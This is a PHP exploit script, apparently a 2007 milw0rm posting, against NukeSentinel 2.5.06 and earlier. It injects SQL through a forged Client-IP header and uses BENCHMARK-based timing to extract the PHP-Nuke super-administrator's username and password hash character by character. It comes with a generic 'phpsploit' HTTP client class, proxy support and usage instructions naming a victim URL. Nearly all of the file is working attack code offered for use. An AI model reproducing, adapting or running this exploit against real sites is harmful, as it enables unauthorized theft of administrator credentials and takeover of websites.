#!/usr/bin/php
<?php
error_reporting(E_ALL ^ E_NOTICE);

if($argc < 3)
{
print("
--  NukeSentinel <= 2.5.06 SQL Injection (mysql >= 4.0.24) Exploit  ---
-----------------------------------------------------------------------
PHP conditions: none
CMS conditions: disable_switch<=0 (module activated), track_active=1
       Credits: DarkFig <gmdarkfig@gmail.com>
           URL: http://www.acid-root.new.fr/
-----------------------------------------------------------------------
  Usage: $argv[0] -url <> [Options]
 Params: -url       For example http://victim.com/phpnuke/ 
Options: -prefix    Table prefix (default=nuke)
         -debug     Debug mod activated (debug_ns.html)
         -truetime  Server response time which returns true
         -benchmark You can change the value used in benchmark()
         -proxy     If you wanna use a proxy <proxyhost:proxyport> 
         -proxyauth Basic authentification <proxyuser:proxypwd>
Example: $argv[0] -url http://localhost/phpnuke/ -debug
   Note: This exploit is based on the server response time
         If you have some problems use -debug, -benchmark, -truetime
-----------------------------------------------------------------------
");exit(1);
}

$url       = getparam("url",1);
$tblprfix  = (getparam("prefix")!="")    ? getparam("prefix") : 'nuke';
$debug     = (getparam("debug")!="")     ? 1 : 0;
$benchmark = (getparam("benchmark")!="") ? getparam("benchmark") : '100000000';
$proxy     = getparam("proxy");
$proxyauth = getparam("proxyauth");

$xpl = new phpsploit();
$xpl->agent('Mozilla Firefox');
$xpl->allowredirection(0);
$xpl->cookiejar(0);

if($proxy) $xpl->proxy($proxy);
if($proxyauth) $xpl->proxyauth($proxyauth);
if($debug) debug(1);

print "\nUsername: ";bruteforce('aid');
print "\nPassword: ";bruteforce('pwd');
exit(0);

function bruteforce($field)
{
	global $url,$xpl,$tblprfix,$truetime,$debug,$benchmark,$sql,$bef,$aft,$fak,$b,$c,$f,$dfield,$a,$result; 
	$a=0;$v='';$dfield=$field;
	
	if(eregi('a',$field)) { $b='-1';$c='127';} # aid charset
	else                  { $b='46';$c='70'; } # pwd charset
	
	while(TRUE)
	{
		$a++;
		for($e=$b;$e<=$c;$e++)
		{
			$fak = rand(128,254).'.'
			      .rand(128,254).'.'
			      .rand(128,254).'.'
			      .rand(128,254);

                        if($e==$b) $f="TST";
			elseif($e==($b+1)) $f="NULL";
			else $f=$e;

                        # $db->sql_query("INSERT INTO `".$prefix."_nsnst_tracked_ips` (`user_id`, `username`, `date`,
                        # `ip_addr`, `ip_long`, `page`, `user_agent`, `refered_from`, `x_forward_for`, `client_ip`, `remote_addr`,
                        # `remote_port`, `request_method`, `c2c`) VALUES ('".$nsnst_const['ban_user_id']."', '$ban_username2',
                        # '".$nsnst_const['ban_time']."', '".$nsnst_const['remote_ip']."', '".$nsnst_const['remote_long']."',
                        # '$pg', '$user_agent', '$refered_from', '".$nsnst_const['forward_ip']."', '".$nsnst_const['client_ip']."',
                        # '".$nsnst_const['remote_addr']."', '".$nsnst_const['remote_port']."', '".$nsnst_const['request_method']."',
                        # '$c2c')");
                        #
			$sql  = "(SELECT IF((SUBSTR(";
			$sql .= ($f=="TST") ? "(SELECT 1)" : "(SELECT $field FROM ${tblprfix}_authors WHERE radminsuper=1)";
			$sql .= ($f=="TST") ? ",1" : ",$a";
			$sql .= ",1)=CHAR(";
			$sql .= ($f=="TST") ? "49" : "$f";
			$sql .= ")),BENCHMARK($benchmark,CHAR(66))";
			$sql .= ",1)),1,1,1,1,1,1,1,1,1)/*";

			$bef = time();
			$xpl->reset("header");
			
			# 2.5.06 CHANGES (2007-03-02):
			# + Corrected a problem causing valid ip users to be tagged as invalid users
                        # ...The old sploit will not work for this version but it's always vulnerable, you missed something.
                        #
			# if(!ereg("^([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})", $nsnst_const['remote_ip']))
                        # {$nsnst_const['remote_ip'] = "none"; }
			#
			$xpl->addheader("Client-IP","$fak',$sql");
			$xpl->get($url);
			$aft = time();

			if($f=="TST") $truetime=($aft-$bef);
			if(getparam("truetime")!="") $truetime = getparam("truetime");
			
			if((($aft-$bef) >= $truetime) AND ($f != "TST")) $result='TRUE';
			else $result='FALSE';
			if($debug) debug();
			
			if($result=='TRUE')
			{
				if($f != "NULL")
				{
					print strtolower(chr($f));
					$v .= chr($f);
					break;
				}
				else
				{
					return $v;
				}
			}
			
			# Retry if no char found
			if($f==$c) $a--;
		}
	}
}

function debug($first='')
{
	global $tblprfix,$truetime,$debug,$benchmark,$sql,$bef,$aft,$fak,$b,$c,$f,$dfield,$a,$result;
	if($first)
	{
		$handle = fopen("debug_ns.html","w+");
		$data = "<h1><div align='center'>NukeSentinel &lt;= 2.5.06 SQL Injection (Debug)</div></h1>
		<pre><table width='0' border='1' align='center' cellspacing='0'><tr>
		<td align='center'><b>REQUEST TIME</b></td>
		<td align='center'><b>RESPONSE TIME</b></td>
		<td align='center'><b>TRUETIME</b></td>
		<td align='center'><b>BENCHMARK</b></td>
		<td align='center'><b>RESULT</b></td>";
		# <td align='center'><b>IP</b></td>
		$data .= "<td align='center'><b>FIELD</b></td>
		<td align='center'><b>CHARSET</b></td>
		<td align='center'><b>SUBSTR()</b></td>
		<td align='center'><b>ORD()</b></td>
		<td align='center'><b>CHAR()</b></td>";
		fwrite($handle,$data);
		fclose($handle);
	}
	else
	{
		$handle = fopen("debug_ns.html","a");
		$data   = "<tr";
		$data  .= ($result=='TRUE') ? " bgcolor='#FFFF00'" : "";
		$data  .= ">
		<td align='center'>&nbsp;".htmlentities($bef)."&nbsp;</td>
		<td align='center'>&nbsp;".htmlentities($aft)."&nbsp;</td>
		<td align='center'>&nbsp;".htmlentities($truetime)."&nbsp;</td>
		<td align='center'>&nbsp;".htmlentities($benchmark)."&nbsp;</td>
		<td align='center'>&nbsp;".htmlentities($result)."&nbsp;</td>";
		# <td align='center'>&nbsp;".htmlentities($fak)."&nbsp;</td>
		$data .= "<td align='center'>&nbsp;".htmlentities($dfield)."&nbsp;</td>
		<td align='center'>&nbsp;".htmlentities("$b-$c")."&nbsp;</td>
		<td align='center'>&nbsp;".htmlentities($a)."&nbsp;</td>
		<td align='center'>&nbsp;".htmlentities($f)."&nbsp;</td>
		<td align='center'>&nbsp;".htmlentities(chr($f))."&nbsp;</td></tr>";
		fwrite($handle,$data);
		fclose($handle);
	}
}

function getparam($param,$opt='')
{
	global $argv;
	foreach($argv as $value => $key)
	{
		if($key == '-'.$param) {
		   if(!empty($argv[$value+1])) return $argv[$value+1];
		   else return 1;
		}
	}
	if($opt) exit("\n-$param parameter required");
	else return;
}

/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 5 (remove "private", "public" if you have PHP 4)
 * VERSION:        1.2
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit {

	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it, this is the main function.
	 *
	 * @return $server_response
	 */
	private function sock()
	{
		if(!empty($this->proxyhost) && !empty($this->proxyport)) $socket = fsockopen($this->proxyhost,$this->proxyport);
		else $socket = fsockopen($this->host,$this->port);
		
		if(!$socket) die("Error: The host doesn't exist");
		
		if($this->method==="get") $this->packet = "GET ".$this->url." HTTP/1.1\r\n";
		elseif($this->method==="post" or $this->method==="formdata") $this->packet = "POST ".$this->url. " HTTP/1.1\r\n";
		else die("Error: Invalid method");
		
		if(!empty($this->proxyuser)) $this->packet .= "Proxy-Authorization: Basic ".base64_encode($this->proxyuser.":".$this->proxypass)."\r\n";
		$this->packet .= "Host: ".$this->host."\r\n";
		
		if(!empty($this->agent))  $this->packet .= "User-Agent: ".$this->agent."\r\n";
		if(!empty($this->header)) $this->packet .= $this->header."\r\n";
		if(!empty($this->cookie)) $this->packet .= "Cookie: ".$this->cookie."\r\n";
		
		$this->packet .= "Connection: Close\r\n";
		if($this->method==="post")
		{
			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
			$this->packet .= "Content-Length: ".strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data."\r\n";
		}
		elseif($this->method==="formdata")
		{
			$this->packet .= "Content-Type: multipart/form-data; boundary=---------------------------".$this->boundary."\r\n";
			$this->packet .= "Content-Length: ".strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data;
		}
		$this->packet .= "\r\n";
		$this->recv = '';
		
		fputs($socket,$this->packet);
		while(!feof($socket)) $this->recv .= fgets($socket);
		fclose($socket);
		
		if($this->cookiejar) $this->cookiejar($this->getheader($this->recv));
		if($this->allowredirection) return $this->allowredirection($this->recv);
		else return $this->recv;
	}
	

	/**
	 * This function allows you to add several cookie in the
	 * request. Several methods are supported:
	 * 
	 * $this->addcookie("name","value");
	 * or
	 * $this->addcookie("name=newvalue");
	 * or
	 * $this->addcookie("othername=overvalue; xx=zz; y=u");
	 * 
	 * @param string $cookiename
	 * @param string $cookievalue
	 * 
	 */
	public function addcookie($cookn,$cookv='')
	{
		// $this->addcookie("name","value"); work avec replace
		if(!empty($cookv))
		{
			if($cookv === "deleted") $cookv=''; // cookiejar(1) && Set-Cookie: name=delete
			if(!empty($this->cookie))
			{
			    if(preg_match("/$cookn=/",$this->cookie))
			    {
			    	$this->cookie = preg_replace("/$cookn=(\S*);/","$cookn=$cookv;",$this->cookie);
			    }
			    else
			    {
			    	$this->cookie .= " ".$cookn."=".$cookv.";"; // " ".
			    }
			}
			else
			{
				$this->cookie = $cookn."=".$cookv.";";
			}
		}
		// $this->addcookie("name=value; othername=othervalue");
		else
		{
	    	 if(!empty($this->cookie))
	    	 {
	    	 	$cookn = preg_replace("/(.*);$/","$1",$cookn);
	    	 	$cookarr = explode(";",str_replace(" ", "",$cookn));
	    	 	for($i=0;$i<count($cookarr);$i++)
	    	 	{
	    	 		preg_match("/(\S*)=(\S*)/",$cookarr[$i],$matches);
	    	 		$cookn = $matches[1];
	    	 		$cookv = $matches[2];
	    	 		$this->addcookie($cookn,$cookv);
	    	 	}
	    	 }
			 else
			 {
			 	$cookn = ((substr($cookn,(strlen($cookn)-1),1))===";") ? $cookn : $cookn.";";
			 	$this->cookie = $cookn;			
			 }
		}
	}
	
	
	/**
	 * This function allows you to add several headers in the
	 * request. Several methods are supported:
	 *
	 * $this->addheader("headername","headervalue");
	 * or
	 * $this->addheader("headername: headervalue");
	 *
	 * @param string $headername
	 * @param string $headervalue
	 */
	public function addheader($headern,$headervalue='')
	{
		// $this->addheader("name","value");
		if(!empty($headervalue))
		{
			if(!empty($this->header))
			{
				if(preg_match("/$headern:/",$this->header))
				{
					$this->header = preg_replace("/$headern: (\S*)/","$headern: $headervalue",$this->header);
				}
				else
				{
					$this->header .= "\r\n".$headern.": ".$headervalue;
				}
			}
			else
			{
				$this->header=$headern.": ".$headervalue;
			}
		}
		// $this->addheader("name: value");
		else 
		{
			if(!empty($this->header))
			{
				$headarr = explode(": ",$headern);
				$headern = $headarr[0];
				$headerv = $headarr[1];
				$this->addheader($headern,$headerv);
			}
			else
			{
				$this->header=$headern;
			}
		}
	}
	

	/**
	 * This function allows you to use an http proxy server.
	 * Several methods are supported:
	 * 
	 * $this->proxy("proxyip","8118");
	 * or
	 * $this->proxy("proxyip:8118")
	 *
	 * @param string $proxyhost
	 * @param integer $proxyport
	 */
	public function proxy($proxy,$proxyp='')
	{
		// $this->proxy("localhost:8118");
		if(empty($proxyp))
		{
			preg_match("/^(\S*):(\d+)$/",$proxy,$proxarr);
			$proxh = $proxarr[1];
			$proxp = $proxarr[2];
			$this->proxyhost=$proxh;
			$this->proxyport=$proxp;
		}
		// $this->proxy("localhost",8118);
		else 
		{
			$this->proxyhost=$proxy;
			$this->proxyport=intval($proxyp);
		}
		if($this->proxyport > 65535) die("Error: Invalid port number");
	}
	

	/**
	 * This function allows you to use an http proxy server
	 * which requires a basic authentification. Several
	 * methods are supported:
	 * 
	 * $this->proxyauth("darkfig","dapasswd");
	 * or
	 * $this->proxyauth("darkfig:dapasswd");
	 *
	 * @param string $proxyuser
	 * @param string $proxypass
	 */
	public function proxyauth($proxyauth,$proxypasse='')
	{
		// $this->proxyauth("darkfig:password");
		if(empty($proxypasse))
		{
			preg_match("/^(.*):(.*)$/",$proxyauth,$proxautharr);
			$proxu = $proxautharr[1];
			$proxp = $proxautharr[2];
			$this->proxyuser=$proxu;
			$this->proxypass=$proxp;
		}
		// $this->proxyauth("darkfig","password");
		else
		{
			$this->proxyuser=$proxyauth;
			$this->proxypass=$proxypasse;
		}
	}

	
	/**
	 * This function allows you to set the "User-Agent" header.
	 * Several methods are possible to do that:
	 * 
	 * $this->agent("Mozilla Firefox");
	 * or
	 * $this->addheader("User-Agent: Mozilla Firefox");
	 * or
	 * $this->addheader("User-Agent","Mozilla Firefox");
	 * 
	 * @param string $useragent
	 */
	public function agent($useragent)
	{
		$this->agent=$useragent;
	}

	
	/**
	 * This function returns the header which will be
	 * in the next request.
	 * 
	 * $this->showheader();
	 *
	 * @return $header
	 */
	public function showheader()
	{
		return $this->header;
	}

	
	/**
	 * This function returns the cookie which will be
	 * in the next request.
	 * 
	 * $this->showcookie();
	 *
	 * @return $storedcookies
	 */
	public function showcookie()
	{
		return $this->cookie;
	}

	
	/**
	 * This function returns the last formed
	 * http request (the http packet).
	 * 
	 * $this->showlastrequest();
	 * 
	 * @return $last_http_request
	 */
	public function showlastrequest()
	{
		return $this->packet;
	}
	
	
	/**
	 * This function sends the formed http packet with the
	 * GET method. You can precise the port of the host.
	 * 
	 * $this->get("http://localhost");
	 * $this->get("http://localhost:888/xd/tst.php");
	 * 
	 * @param string $urlwithpath
	 * @return $server_response
	 */
	public function get($url)
	{
		$this->target($url);
		$this->method="get";
		return $this->sock();
	}

	
	/**
	 * This function sends the formed http packet with the
	 * POST method. You can precise the port of the host.
	 * 
	 * $this->post("http://localhost/index.php","admin=1&user=dark");
	 *
	 * @param string $urlwithpath
	 * @param string $postdata
	 * @return $server_response
	 */	
	public function post($url,$data)
	{
		$this->target($url);
		$this->method="post";
		$this->data=$data;
		return $this->sock();
	}
	

	/**
	 * This function sends the formed http packet with the
	 * POST method using the multipart/form-data enctype. 
	 * 
	 * $array = array(
	 *          frmdt_url      => "http://localhost/upload.php",
	 *          frmdt_boundary => "123456",                    # Optional
	 *                 "email" => "me@u.com",
	 *               "varname" => array(
	 *                            frmdt_type => "image/gif",   # Optional
	 *                       frmdt_transfert => "binary",      # Optional
	 *                        frmdt_filename => "hello.php",
	 *                         frmdt_content => "<?php echo ':)'; ?>"));
	 * $this->formdata($array);
	 *
	 * @param array $array
	 * @return $server_response
	 */
	public function formdata($array)
	{
		$this->target($array[frmdt_url]);
		$this->method="formdata";
		$this->data='';
		if(!isset($array[frmdt_boundary])) $this->boundary="phpsploit";
		else $this->boundary=$array[frmdt_boundary];
		foreach($array as $key => $value)
		{
			if(!preg_match("#^frmdt_(boundary|url)#",$key))
			{
				$this->data .= "-----------------------------".$this->boundary."\r\n";
				$this->data .= "Content-Disposition: form-data; name=\"".$key."\";";
				if(!is_array($value))
				{
					$this->data .= "\r\n\r\n".$value."\r\n";
				}
				else
				{
					$this->data .= " filename=\"".$array[$key][frmdt_filename]."\";\r\n";
					if(isset($array[$key][frmdt_type])) $this->data .= "Content-Type: ".$array[$key][frmdt_type]."\r\n";
					if(isset($array[$key][frmdt_transfert])) $this->data .= "Content-Transfer-Encoding: ".$array[$key][frmdt_transfert]."\r\n";
					$this->data .= "\r\n".$array[$key][frmdt_content]."\r\n";
				}
			}
		}
		$this->data .= "-----------------------------".$this->boundary."--\r\n";
		return $this->sock();
	}

	
	/**
	 * This function returns the content of the server response
	 * without the headers.
	 * 
	 * $this->getcontent($this->get("http://localhost/"));
	 * or
	 * $this->getcontent();
	 *
	 * @param string $server_response
	 * @return $onlythecontent
	 */
	public function getcontent($code='')
	{
		if(empty($code)) $code = $this->recv;
		$content = explode("\n",$code);
		$onlycode = '';
		for($i=1;$i<count($content);$i++)
		{
			if(!preg_match("/^(\S*):/",$content[$i])) $ok = 1;
			if($ok) $onlycode .= $content[$i]."\n";
		}
		return $onlycode;
	}

	
	/**
	 * This function returns the headers of the server response
	 * without the content.
	 * 
	 * $this->getheader($this->post("http://localhost/x.php","x=1&z=2"));
	 * or
	 * $this->getheader();
	 *
	 * @param string $server_response
	 * @return $onlytheheaders
	 */
	public function getheader($code='')
	{
		if(empty($code)) $code = $this->recv;
		$header = explode("\n",$code);
		$onlyheader = $header[0]."\n";
		for($i=1;$i<count($header);$i++)
		{
			if(!preg_match("/^(\S*):/",$header[$i])) break;
			$onlyheader .= $header[$i]."\n";
		}
		return $onlyheader;
	}

	
	/**
	 * This function is called by the cookiejar() function.
	 * It adds the value of the "Set-Cookie" header in the "Cookie"
	 * header for the next request. You don't have to call it.
	 * 
	 * @param string $server_response
	 */
	private function getcookie($code)
	{
		$carr = explode("\n",str_replace("\r\n","\n",$code));
		for($z=0;$z<count($carr);$z++)
		{
			if(preg_match("/set-cookie: (.*)/i",$carr[$z],$cookarr))
			{
				$cookie[] = preg_replace("/expires=(.*)(GMT||UTC)(\S*)$/i","",preg_replace("/path=(.*)/i","",$cookarr[1]));
			}
		}

		for($i=0;$i<count($cookie);$i++)
		{
			preg_match("/(\S*)=(\S*)(|;)/",$cookie[$i],$matches);
	    	        $cookn = $matches[1];
	    	        $cookv = $matches[2];
	    	        $this->addcookie($cookn,$cookv);
		}
    }

	
	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it.
	 *
	 * @param string $urltarg
	 */
	private function target($urltarg)
	{
		if(!preg_match("/^http:\/\/(.*)\//",$urltarg)) $urltarg .= "/";
		$this->url=$urltarg;
		
		$array = explode("/",str_replace("http://","",preg_replace("/:(\d+)/","",$urltarg)));
		$this->host=$array[0];

		preg_match("/:(\d+)\//",$urltarg,$matches);
		$this->port=empty($matches[1]) ? 80 : $matches[1];
		
		$temp = str_replace("http://","",preg_replace("/:(\d+)/","",$urltarg));
		preg_match("/\/(.*)\//",$temp,$matches);
		$this->path=str_replace("//","/","/".$matches[1]."/");
	
		if($this->port > 65535) die("Error: Invalid port number");
	}
	
	
	/**
	 * If you call this function, the script will
	 * extract all "Set-Cookie" headers values
	 * and it will automatically add them into the "Cookie" header
	 * for all next requests.
	 *
	 * $this->cookiejar(1); // enabled
	 * $this->cookiejar(0); // disabled
	 * 
	 */
	public function cookiejar($code)
	{
		if($code===0) $this->cookiejar='';
		if($code===1) $this->cookiejar=1;
		else
		{
			$this->getcookie($code);
		}
	}


	/**
	 * If you call this function, the script will
	 * follow all redirections sent by the server.
	 * 
	 * $this->allowredirection(1); // enabled
	 * $this->allowredirection(0); // disabled
	 * 
	 * @return $this->get($locationresponse)
	 */
	public function allowredirection($code)
	{
		if($code===0) $this->allowredirection='';
		if($code===1) $this->allowredirection=1;
		else
		{
			if(preg_match("/(location|content-location|uri): (.*)/i",$code,$codearr))
			{
				$location = str_replace(chr(13),'',$codearr[2]);
				if(!eregi("://",$location))
				{
					return $this->get("http://".$this->host.$this->path.$location);
				}
				else
				{
					return $this->get($location);
				}
			}
			else
			{
				return $code;
			}
		}
	}
	
	
	/**
	 * This function allows you to reset some parameters:
	 * 
	 * $this->reset(header); // headers cleaned
	 * $this->reset(cookie); // cookies cleaned
	 * $this->reset();       // clean all parameters
	 *
	 * @param string $func
	 */
	public function reset($func='')
	{
		switch($func)
		{
			case "header":
			$this->header='';
			break;
			
			case "cookie":
			$this->cookie='';
			break;
			
			default:
		        $this->cookiejar='';
		        $this->header='';
		        $this->cookie='';
		        $this->allowredirection=''; 
		        $this->agent='';
		        break;
		}
	}
}
?>

# milw0rm.com [2007-03-10]
